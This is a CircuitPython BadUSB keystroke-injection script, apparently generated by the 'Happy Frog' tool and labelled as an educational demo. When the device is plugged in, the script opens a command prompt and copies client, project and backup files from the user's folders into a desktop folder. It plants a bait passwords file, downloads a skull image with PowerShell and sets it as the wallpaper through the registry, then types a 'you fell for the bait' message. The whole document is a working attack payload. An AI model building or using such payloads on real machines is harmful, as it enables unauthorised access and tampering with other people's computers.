"""
Happy Frog - Generated CircuitPython Code
Educational HID Emulation Script

This code was automatically generated from a Happy Frog Script.
It demonstrates how to use CircuitPython for HID emulation.

⚠️ IMPORTANT: Use only for educational purposes and authorized testing!
"""

import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode

# Initialize HID devices
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

# Educational note: This creates a virtual keyboard that the computer
# will recognize as a USB HID device. The keyboard can send keystrokes
# just like a physical keyboard would.

# Script Information:
# Source: ducky_converted.txt
# Total Commands: 64
# Total Lines: 66

# Main execution loop
def main():
    # Wait for system to recognize the device
    time.sleep(2)

    # Command 1: # Happy Frog Script - Converted from Ducky Script
    #  Happy Frog Script - Converted from Ducky Script

    # Command 2: # Original source: ducky.txt
    #  Original source: ducky.txt

    # Command 3: # Educational conversion - review all commands before execution
    #  Educational conversion - review all commands before execution

    # Command 4: # BadUSB Demo: Open Terminal, Notepad, and type a message
    #  BadUSB Demo: Open Terminal, Notepad, and type a message

    # Command 5: ATTACKMODE HID STORAGE
    # ATTACKMODE: Configured for HID emulation (HID STORAGE)
    # Note: This device is configured as a HID keyboard/mouse
    # Configuration: HID STORAGE

    # Command 6: DELAY 2000
    time.sleep(2.0)  # Delay for 2000ms

    # Command 7: # Open File Explorer
    #  Open File Explorer

    # Command 8: MOD e
    keyboard.press(Keycode.GUI)  # Press MOD
    keyboard.press(Keycode.E)  # Press e
    keyboard.release(Keycode.E)  # Release e
    keyboard.release(Keycode.GUI)  # Release MOD

    # Command 9: DELAY 1000
    time.sleep(1.0)  # Delay for 1000ms

    # Command 10: # Open Command Prompt
    #  Open Command Prompt

    # Command 11: MOD r
    keyboard.press(Keycode.GUI)  # Press MOD
    keyboard.press(Keycode.R)  # Press r
    keyboard.release(Keycode.R)  # Release r
    keyboard.release(Keycode.GUI)  # Release MOD

    # Command 12: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 13: STRING cmd
    keyboard_layout.write("cmd")  # Type: cmd

    # Command 14: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 15: DELAY 1000
    time.sleep(1.0)  # Delay for 1000ms

    # Command 16: # Search and copy files named client*, project*, or backup* from Documents, Desktop, and Downloads to Desktop\Do Not Delete
    #  Search and copy files named client*, project*, or backup* from Documents, Desktop, and Downloads to Desktop\Do Not Delete

    # Command 17: STRING mkdir "%USERPROFILE%\Desktop\Do Not Delete" & for %i in (client* project* backup*) do (for /r "%USERPROFILE%\Documents" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Desktop" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Downloads" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete")
    keyboard_layout.write("mkdir \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for %i in (client* project* backup*) do (for /r \"%USERPROFILE%\\Documents\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Desktop\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Downloads\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\")")  # Type: mkdir "%USERPROFILE%\Desktop\Do Not Delete" & for %i in (client* project* backup*) do (for /r "%USERPROFILE%\Documents" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Desktop" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Downloads" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete")

    # Command 18: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 19: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 20: STRING for %i in (client* project* backup*) do (for /r "%USERPROFILE%\Documents" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Desktop" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Downloads" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete")
    keyboard_layout.write("for %i in (client* project* backup*) do (for /r \"%USERPROFILE%\\Documents\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Desktop\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\" & for /r \"%USERPROFILE%\\Downloads\" %f in (%i.*) do copy \"%f\" \"%USERPROFILE%\\Desktop\\Do Not Delete\")")  # Type: for %i in (client* project* backup*) do (for /r "%USERPROFILE%\Documents" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Desktop" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete" & for /r "%USERPROFILE%\Downloads" %f in (%i.*) do copy "%f" "%USERPROFILE%\Desktop\Do Not Delete")

    # Command 21: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 22: DELAY 1000
    time.sleep(1.0)  # Delay for 1000ms

    # Command 23: # Add sample files
    #  Add sample files

    # Command 24: STRING echo ExamplePassword123! > "%USERPROFILE%\Desktop\Do Not Delete\passwords.txt"
    keyboard_layout.write("echo ExamplePassword123! > \"%USERPROFILE%\\Desktop\\Do Not Delete\\passwords.txt\"")  # Type: echo ExamplePassword123! > "%USERPROFILE%\Desktop\Do Not Delete\passwords.txt"

    # Command 25: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 26: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 27: STRING echo If you are reading this, you fell for the bait! > "%USERPROFILE%\Desktop\Do Not Delete\README.txt"
    keyboard_layout.write("echo If you are reading this, you fell for the bait! > \"%USERPROFILE%\\Desktop\\Do Not Delete\\README.txt\"")  # Type: echo If you are reading this, you fell for the bait! > "%USERPROFILE%\Desktop\Do Not Delete\README.txt"

    # Command 28: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 29: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 30: # Change wallpaper to hacker skull
    #  Change wallpaper to hacker skull

    # Command 31: STRING powershell -command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\DoNotDeleteWallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\DoNotDeleteWallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"
    keyboard_layout.write("powershell -command \"Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\\Desktop\\DoNotDeleteWallpaper.jpg; reg add 'HKCU\\Control Panel\\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\\Desktop\\DoNotDeleteWallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters\"")  # Type: powershell -command "Invoke-WebRequest -Uri 'https://wallpapers.com/images/hd/black-skull-hacker-3i5cydng2l8h144o.jpg' -OutFile $env:USERPROFILE\Desktop\DoNotDeleteWallpaper.jpg; reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $env:USERPROFILE\Desktop\DoNotDeleteWallpaper.jpg /f; RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters"

    # Command 32: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 33: DELAY 3000
    time.sleep(3.0)  # Delay for 3000ms

    # Command 34: # Open Notepad
    #  Open Notepad

    # Command 35: MOD r
    keyboard.press(Keycode.GUI)  # Press MOD
    keyboard.press(Keycode.R)  # Press r
    keyboard.release(Keycode.R)  # Release r
    keyboard.release(Keycode.GUI)  # Release MOD

    # Command 36: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 37: STRING notepad
    keyboard_layout.write("notepad")  # Type: notepad

    # Command 38: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 39: DELAY 1500
    time.sleep(1.5)  # Delay for 1500ms

    # Command 40: # Type ASCII "Zero" in Notepad
    #  Type ASCII "Zero" in Notepad

    # Command 41: STRING  ______   ______   _____    ______
    keyboard_layout.write("______   ______   _____    ______")  # Type: ______   ______   _____    ______

    # Command 42: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 43: STRING |___  /  |  ____| |  __ \  |  __  |
    keyboard_layout.write("|___  /  |  ____| |  __ \\  |  __  |")  # Type: |___  /  |  ____| |  __ \  |  __  |

    # Command 44: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 45: STRING    / /   | |__    | |__) | | |  | |
    keyboard_layout.write("/ /   | |__    | |__) | | |  | |")  # Type: / /   | |__    | |__) | | |  | |

    # Command 46: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 47: STRING   / /    |  __|   |  _  /  | |  | |
    keyboard_layout.write("/ /    |  __|   |  _  /  | |  | |")  # Type: / /    |  __|   |  _  /  | |  | |

    # Command 48: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 49: STRING  / /__   | |____  | | \ \  | |__| |
    keyboard_layout.write("/ /__   | |____  | | \\ \\  | |__| |")  # Type: / /__   | |____  | | \ \  | |__| |

    # Command 50: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 51: STRING /_____|  |______| |_|  \_\ |______|
    keyboard_layout.write("/_____|  |______| |_|  \\_\\ |______|")  # Type: /_____|  |______| |_|  \_\ |______|

    # Command 52: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 53: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 54: STRING never trust an open machine
    keyboard_layout.write("never trust an open machine")  # Type: never trust an open machine

    # Command 55: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 56: DELAY 500
    time.sleep(0.5)  # Delay for 500ms

    # Command 57: STRING *** DEMO: Your files have been copied. This is a security demonstration. ***
    keyboard_layout.write("*** DEMO: Your files have been copied. This is a security demonstration. ***")  # Type: *** DEMO: Your files have been copied. This is a security demonstration. ***

    # Command 58: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 59: STRING To protect your data, always lock your machine and use strong passwords.
    keyboard_layout.write("To protect your data, always lock your machine and use strong passwords.")  # Type: To protect your data, always lock your machine and use strong passwords.

    # Command 60: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 61: STRING This was a demo. Next time, don't plug in random USB drives or borrow chargers!
    keyboard_layout.write("This was a demo. Next time, don't plug in random USB drives or borrow chargers!")  # Type: This was a demo. Next time, don't plug in random USB drives or borrow chargers!

    # Command 62: ENTER
    keyboard.press(Keycode.ENTER)  # Press ENTER
    keyboard.release(Keycode.ENTER)  # Release ENTER

    # Command 63: # Conversion completed by Happy Frog
    #  Conversion completed by Happy Frog

    # Command 64: # Remember: Use only for educational purposes and authorized testing!
    #  Remember: Use only for educational purposes and authorized testing!


# Run the main function
if __name__ == '__main__':
    main()

"""
End of Happy Frog Generated Code

Educational Notes:
- This script demonstrates basic HID emulation techniques
- Always test in controlled environments
- Use responsibly and ethically
- Consider the security implications of automated input

For more information, visit: https://github.com/ZeroDumb/happy-frog
"""